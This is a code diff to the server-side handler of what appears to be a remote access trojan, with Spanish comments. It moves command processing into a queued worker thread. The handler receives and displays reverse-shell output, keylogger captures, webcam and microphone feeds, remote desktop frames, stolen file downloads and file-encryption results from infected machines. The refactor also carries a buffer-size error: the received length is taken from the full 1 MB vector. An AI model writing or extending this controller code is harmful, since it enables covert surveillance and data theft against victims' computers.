@@ -68,7 +68,7 @@ void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
 
 void Cliente_Handler::Command_Handler(){
     int iBufferSize = 1024 * 1024; //1 MB
-    std::unique_ptr<char[]> cBuffer = std::make_unique<char[]>(iBufferSize);
+    std::vector<char> cBuffer(iBufferSize);
     DWORD error_code = 0;
     int iTempRecibido = 0;
     while (true) {
@@ -79,7 +79,7 @@ void Cliente_Handler::Command_Handler(){
         }
         
         
-        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer.get(), iBufferSize - 1, 0, true, &error_code);
+        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer.data(), iBufferSize - 1, 0, true, &error_code);
         this->SetBytesRecibidos(iTempRecibido);
 
         //timeout
@@ -112,89 +112,125 @@ void Cliente_Handler::Command_Handler(){
 
         cBuffer[this->BytesRecibidos()] = '\0';
 
-        std::vector<std::string> vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 1);
-        if (vcDatos.size() == 0) {
-            this->Log("No se pudo procesar el buffer");
-            continue;
+        //Agregar datos al queue
+        std::unique_lock<std::mutex> lock(this->mt_Queue);
+        this->queue_Comandos.push(cBuffer);
+    }
+
+    this->Log("Done");
+
+}
+
+void Cliente_Handler::Process_Queue() {
+
+    while (true) {
+        int iTotal = 0;
+        std::unique_lock<std::mutex> lock(this->mt_Queue);
+        iTotal = this->queue_Comandos.size();
+        lock.unlock();
+
+        if (!this->isfRunning() && iTotal == 0) {break;}
+
+        lock.lock();
+        if (iTotal > 0) {
+            this->Process_Command(this->queue_Comandos.front()); //Procesar comando
+            this->queue_Comandos.pop(); //Elminar del queue
         }
+        lock.unlock();
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    }
+}
 
-        //Prioridad para descarga de archivos
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
-            if (vcDatos.size() == 2) {
-                // CMD + 2 slashs /  +len del id
-                int iHeader = 5 + vcDatos[1].size();
-                int iBytesSize = this->BytesRecibidos() - iHeader;
-                char* cBytes = cBuffer.get() + iHeader;
-                if(this->um_Archivos_Descarga[vcDatos[1]].ssOutFile.get()->is_open()) {
-                    this->um_Archivos_Descarga[vcDatos[1]].ssOutFile.get()->write(cBytes, iBytesSize);
-                    //fwrite(cBytes, sizeof(char), iBytesSize, fp);
-                    //Por los momentos solo es necesario que el servidor almacene el progreso
-                    //this->um_Archivos_Descarga[vcDatos[1]].uDescargado += iBytesSize;
+void Cliente_Handler::Process_Command(std::vector<char>& cBuffer) {
+    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 1);
+    if (vcDatos.size() == 0) {
+        this->Log("No se pudo procesar el buffer");
+        return;
+    }
+    int iRecibido = cBuffer.size();
+    int iHeadSize = vcDatos[0].size() + 1;
+    int iComando = atoi(vcDatos[0].c_str());
 
-                    std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
-                    p_Servidor->vcTransferencias[vcDatos[1]].uDescargado += iBytesSize;
-                }else {
-                    this->Log("El archivo no esta abierto");
-                }
+    //Prioridad para descarga de archivos
+    if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
+        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
+        if (vcDatos.size() == 2) {
+            // CMD + 2 slashs /  +len del id
+            int iHeader = 5 + vcDatos[1].size();
+            int iBytesSize = iRecibido - iHeader;
+            char* cBytes = cBuffer.data() + iHeader;
+            if (this->um_Archivos_Descarga[vcDatos[1]].ssOutFile.get()->is_open()) {
+                this->um_Archivos_Descarga[vcDatos[1]].ssOutFile.get()->write(cBytes, iBytesSize);
+                //fwrite(cBytes, sizeof(char), iBytesSize, fp);
+                //Por los momentos solo es necesario que el servidor almacene el progreso
+                //this->um_Archivos_Descarga[vcDatos[1]].uDescargado += iBytesSize;
+
+                std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
+                p_Servidor->vcTransferencias[vcDatos[1]].uDescargado += iBytesSize;
             }
-            continue;
-        }
-
-        //Pquete inicial
-        if (vcDatos[0] == "01") {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 5);
-            if (vcDatos.size() < 4) {
-                this->Log("Error procesando los datos " + std::string(cBuffer.get()));
-                continue;;
+            else {
+                this->Log("El archivo no esta abierto");
             }
-            struct Cliente structTmp;
-
-            structTmp._strSo = this->p_Cliente._strSo = vcDatos[1];
-            structTmp._strUser = this->p_Cliente._strUser = vcDatos[2];
-            structTmp._strPID = this->p_Cliente._strPID = vcDatos[3];
-            structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[4];
-            structTmp._id = this->p_Cliente._id;
-            structTmp._strIp = this->p_Cliente._strIp;
-            
-            p_Servidor->m_InsertarCliente(structTmp);
-            
-            continue;
         }
+        return;
+    }
 
-        //Termino la shell
-        if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { 
+    //Pquete inicial
+    if (iComando == EnumComandos::INIT_PACKET) {
+        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 5);
+        if (vcDatos.size() < 4) {
+            this->Log("Error procesando los datos " + std::string(cBuffer.data()));
+            return;
+        }
+        struct Cliente structTmp;
+
+        structTmp._strSo = this->p_Cliente._strSo = vcDatos[1];
+        structTmp._strUser = this->p_Cliente._strUser = vcDatos[2];
+        structTmp._strPID = this->p_Cliente._strPID = vcDatos[3];
+        structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[4];
+        structTmp._id = this->p_Cliente._id;
+        structTmp._strIp = this->p_Cliente._strIp;
+
+        p_Servidor->m_InsertarCliente(structTmp);
+
+        return;
+    }
+
+    //Termino la shell
+    if (iComando == EnumComandos::Reverse_Shell_Finish) {
+        if (this->m_isFrameVisible()) {
             this->EscribirSalidShell(std::string("Sapeeeeeeeeeeee"));
-            continue;
         }
+        return;
+    }
 
-        //Salida de shell
-        if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Salida)) {
-            int iCmdH = (std::to_string(EnumComandos::Reverse_Shell_Salida).size() + 1);
-            char* pBuf = cBuffer.get() + iCmdH;
+    //Salida de shell
+    if (iComando == EnumComandos::Reverse_Shell_Salida) {
+        if (this->m_isFrameVisible()) {
+            char* pBuf = cBuffer.data() + iHeadSize;
             this->EscribirSalidShell(std::string(pBuf));
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
-            if (vcDatos.size() == 2) {
-                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
-                //Comprobar que al movel el puntero no se pase del buffer
-                int iPos = vcDatos[0].size() + 1;
-                iPos = (iPos < iRecibido) ? iPos : 0;
+    //Listar directorio
+    if (iComando == EnumComandos::FM_Dir_Folder) {
+        if (this->m_isFrameVisible()) {
+            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
+            //Comprobar que al movel el puntero no se pase del buffer
 
-                char* cFilesBuffer = cBuffer.get() + iPos;
-                if (temp_list && cFilesBuffer) {
-                    temp_list->ListarDir(cFilesBuffer);
-                }
-
+            char* cFilesBuffer = cBuffer.data() + iHeadSize;
+            if (temp_list && cFilesBuffer) {
+                temp_list->ListarDir(cFilesBuffer);
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
-            char* pBuf = cBuffer.get() + 4;
+    //Listar dispositivos de almacenamiento
+    if (iComando == EnumComandos::FM_Discos_Lista) {
+        if (this->m_isFrameVisible()) {
+            char* pBuf = cBuffer.data() + iHeadSize;
             std::vector<std::string> vDrives = strSplit(std::string(pBuf), CMD_DEL, 100);
 
             if (vDrives.size() > 0) {
@@ -202,86 +238,93 @@ void Cliente_Handler::Command_Handler(){
                 if (temp_list) {
                     temp_list->ListarEquipo(vDrives);
                 }
-                
+
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 3);
-            if (vcDatos.size() == 3) {
-                //Tama�o del archivo recibido
-                u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
+    //Paquete inicial para descargar archivo
+    if (iComando == EnumComandos::FM_Descargar_Archivo_Init) {
+        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 3);
+        if (vcDatos.size() == 3) {
+            //Tama�o del archivo recibido
+            u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
 
-                this->um_Archivos_Descarga[vcDatos[1]].uTamarchivo = uTamArchivo;
+            this->um_Archivos_Descarga[vcDatos[1]].uTamarchivo = uTamArchivo;
 
-                std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
-                p_Servidor->vcTransferencias[vcDatos[1]].uTamano = uTamArchivo;
-                lock.unlock();
+            std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
+            p_Servidor->vcTransferencias[vcDatos[1]].uTamano = uTamArchivo;
+            lock.unlock();
 
-                std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
+            std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
+        }
+        return;
+    }
+
+    //Se termino la descarga del archivo
+    if (iComando == EnumComandos::FM_Descargar_Archivo_End) {
+        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
+        if (vcDatos.size() == 2) {
+            if (this->um_Archivos_Descarga[vcDatos[1]].ssOutFile->is_open()) {
+                this->um_Archivos_Descarga[vcDatos[1]].ssOutFile->close();
             }
-            continue;
+
+            this->Log("[!] Descarga completa");
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
-            if (vcDatos.size() == 2) {
-                if (this->um_Archivos_Descarga[vcDatos[1]].ssOutFile->is_open()) {
-                    this->um_Archivos_Descarga[vcDatos[1]].ssOutFile->close();
-                }
-
-                this->Log("[!] Descarga completa");
-            }
-            continue;
-        }
-
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_Editar_Archivo_Paquete)) {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
+    //Paque de editor de texto remoto
+    if (iComando == EnumComandos::FM_Editar_Archivo_Paquete) {
+        if (this->m_isFrameVisible()) {
+            vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 //Tama�o del id del comando, id del archivo y dos back slashes
-                int iHeadSize = 2 + vcDatos[0].size() + vcDatos[1].size();
-                char* cBytes = cBuffer.get() + iHeadSize;
+                int iHeadSize2 = 2 + vcDatos[0].size() + vcDatos[1].size();
+                char* cBytes = cBuffer.data() + iHeadSize2;
 
                 wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[1], this->n_Frame);
                 if (temp_edit_form) {
                     temp_edit_form->p_txtEditor->AppendText(wxString(cBytes));
                     temp_edit_form->p_txtEditor->SetInsertionPoint(0);
-                    ;
                 }
                 else {
                     this->Log("No se pudo encontrar la ventana con id " + vcDatos[1]);
                 }
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_Crypt_Confirm)) {
-            //Confirmacion de cifrado
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
-            if (vcDatos.size() == 2) {
-                wxString strMessage = "";
-                if (vcDatos[1] == "1") {
-                    strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
-                }
-                else if (vcDatos[1] == "2") {
-                    strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
-                }
-                else if (vcDatos[1] == "3") {
-                    strMessage = "[CYRPT] Operacion completada";
-                }
-
-                wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
+    //Confirmacion de cifrado
+    if (iComando == EnumComandos::FM_Crypt_Confirm) {
+        vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
+        if (vcDatos.size() == 2) {
+            wxString strMessage = "";
+            if (vcDatos[1] == "1") {
+                strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
             }
-            continue;
-        }
+            else if (vcDatos[1] == "2") {
+                strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
+            }
+            else if (vcDatos[1] == "3") {
+                strMessage = "[CYRPT] Operacion completada";
+            }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::FM_CPATH)) {
+            wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
+        }
+        return;
+    }
+
+    //El cliente envio la ruta actual del administrador de archivos
+    if (iComando == EnumComandos::FM_CPATH) {
+        if (this->m_isFrameVisible()) {
             panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
             if (temp_panel) {
-                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer.get() + 4));
+                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer.data() + 4));
                 temp_panel->c_RutaActual.clear();
-                std::vector<std::string> vcSubRutas = strSplit(cBuffer.get() + 4, CMD_DEL, 100);
+                std::vector<std::string> vcSubRutas = strSplit(cBuffer.data() + 4, CMD_DEL, 100);
                 for (auto item : vcSubRutas) {
                     std::string strTemp = item;
                     strTemp += "\\";
@@ -291,31 +334,41 @@ void Cliente_Handler::Command_Handler(){
             else {
                 this->Log("No se pudo encontrar panel FM activo");
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::PM_Lista)) {
-            char* cData = cBuffer.get() + vcDatos[0].size() + 1;
+    //Lista de procesos remotos
+    if (iComando == EnumComandos::PM_Lista) {
+        if (this->m_isFrameVisible()) {
+            char* cData = cBuffer.data() + iHeadSize;
             panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
             if (panel_proc) {
                 panel_proc->listManager->AgregarData(std::string(cData), this->p_Cliente._strPID);
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::KL_Salida)) {
+    //Log del keylogger
+    if (iComando == EnumComandos::KL_Salida  ) {
+        if (this->m_isFrameVisible()) {
             panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
             if (temp_panel) {
-                char* cKeyData = cBuffer.get() + (vcDatos[0].size() + 1);
+                char* cKeyData = cBuffer.data() + iHeadSize;
                 temp_panel->txt_Data->AppendText(cKeyData);
-            }else {
+            }
+            else {
                 this->Log("[X] No se pudo encontrar el panel keylogger");
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::CM_Lista_Salida)) {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
+    //mod camara - Lista de dispositivos
+    if (iComando == EnumComandos::CM_Lista_Salida) {
+        if (this->m_isFrameVisible()) {
+            vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
                 if (vcCams.size() > 0) {
@@ -330,30 +383,36 @@ void Cliente_Handler::Command_Handler(){
                     }
                 }
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::CM_Single_Salida)){
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
+    //mod camara - Buffer de video de la camara
+    if (iComando == EnumComandos::CM_Single_Salida) {
+        if (this->m_isFrameVisible()) {
+            vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 //CMD DEL ID_DEV DEL BUFFER
-                this->Log(cBuffer.get());
-                int iHeadSize = vcDatos[0].size() + vcDatos[1].size() + 2; //CMD + len de dos delimitador + len del id del dev
-                int iBuffSize = iTempRecibido - iHeadSize;
-                char* cBytes = cBuffer.get() + iHeadSize;
+                this->Log(cBuffer.data());
+                int iHeadSize2 = vcDatos[0].size() + vcDatos[1].size() + 2; //CMD + len de dos delimitador + len del id del dev
+                int iBuffSize = iRecibido - iHeadSize2;
+                char* cBytes = cBuffer.data() + iHeadSize2;
                 panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
                 if (panel_picture) {
-                    panel_picture->OnDrawBuffer(cBytes, iBuffSize); 
+                    panel_picture->OnDrawBuffer(cBytes, iBuffSize);
                 }
                 else {
                     this->Log("[X] No se pudo encontrar el panel de camara");
                 }
             }
-            continue;
-;        }
+        }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::Mic_Refre_Resultado)) {
-            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 15);
+    //mod microfono - Lista de dispositivos
+    if (iComando == EnumComandos::Mic_Refre_Resultado) {
+        if (this->m_isFrameVisible()) {
+            vcDatos = strSplit(std::string(cBuffer.data()), CMD_DEL, 15); //15 maximo :v
             if (vcDatos.size() > 0) {
                 wxArrayString cli_devices;
                 for (int i = 1; i<int(vcDatos.size()); i++) {
@@ -372,42 +431,42 @@ void Cliente_Handler::Command_Handler(){
                     std::cout << "No se pudo encontrar ventana activa\n";
                 }
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::Mic_Live_Packet)) {
+    //mod microfono - Reproducir buffer de audio
+    if (iComando == EnumComandos::Mic_Live_Packet) {
+        if (this->m_isFrameVisible()) {
             if (this->OpenPlayer()) {
-                int iHeadSize = vcDatos[0].size() + 1;
                 int iRawSize = this->BytesRecibidos() - iHeadSize;
-                char* cBuff = cBuffer.get() + iHeadSize;
+                char* cBuff = cBuffer.data() + iHeadSize;
                 this->PlayBuffer(cBuff, iRawSize);
-
                 this->ClosePlayer();
-            }else {
+            }
+            else {
                 this->Log("No se pudo abrir el reproductor");
             }
-            continue;
         }
+        return;
+    }
 
-        if (vcDatos[0] == std::to_string(EnumComandos::RD_Salida)) {
-            int iHeadSize = vcDatos[0].size() + 1;
-            char* cPicBuffer = cBuffer.get() + iHeadSize;
-            int iBufferSize = iTempRecibido - iHeadSize;
+    //mod escritorio remoto - Buffer de video del escritorio
+    if (iComando == EnumComandos::RD_Salida) {
+        if (this->m_isFrameVisible()) {
+            char* cPicBuffer = cBuffer.data() + iHeadSize;
+            int iBufferSize = iRecibido - iHeadSize;
             frameRemoteDesktop* temp_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
             if (temp_frame) {
                 temp_frame->OnDrawBuffer(cPicBuffer, iBufferSize);
             }
-            continue;
         }
-
+        return;
     }
-
-    this->Log("Done");
-
 
 }
 
-void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
+void Cliente_Handler::EscribirSalidShell(const std::string strSalida) {
     panelReverseShell* panel_shell = (panelReverseShell*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Reverse_Shell, this->n_Frame);
     if (panel_shell) {
         panel_shell->txtConsole->AppendText(strSalida);
@@ -416,12 +475,14 @@ void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
     }
 }
 
-void Cliente_Handler::Spawn_Thread() {
+void Cliente_Handler::Spawn_Threads() {
     this->p_thHilo = std::thread(&Cliente_Handler::Command_Handler, this);
+    this->p_thQueue = std::thread(&Cliente_Handler::Process_Queue, this);
 }
 
 //funcion que crea el frame principal para interactuar con el cliente
-void Cliente_Handler::CrearFrame(std::string strTitle, std::string strID) {
+void Cliente_Handler::CrearFrame(const std::string strTitle,const std::string strID) {
+    this->m_setFrameVisible(true);
     this->n_Frame = DBG_NEW FrameCliente(strTitle, this->p_Cliente._sckCliente, this->p_Cliente._strIp);
     this->n_Frame->Show(true);
 }
@@ -777,7 +838,7 @@ void Servidor::m_Escucha(){
                 //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                 std::unique_lock<std::mutex> lock(vector_mutex);
                 this->vc_Clientes.push_back(DBG_NEW Cliente_Handler(structNuevoCliente));
-                this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Thread();
+                this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Threads();
                 
                 MyFrame* main = (MyFrame*)wxWindow::FindWindowById(EnumIDS::ID_MAIN);
                 if (main) {
